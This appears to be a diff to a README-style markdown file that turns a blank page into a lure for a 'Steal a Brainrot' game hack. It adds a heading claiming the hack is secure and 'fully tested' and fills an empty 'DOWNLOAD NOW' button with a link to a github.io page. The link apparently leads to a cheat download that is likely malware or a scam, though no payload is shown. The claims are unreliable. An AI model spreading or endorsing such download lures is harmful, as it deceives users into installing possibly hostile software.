@@ -1,10 +1,10 @@
-
+# how to get Steal a Brainrot hack 2026. Our secure Steal a Brainrot hack are fully tested and ready for use.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://catalog-avatar-creator-hk00.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
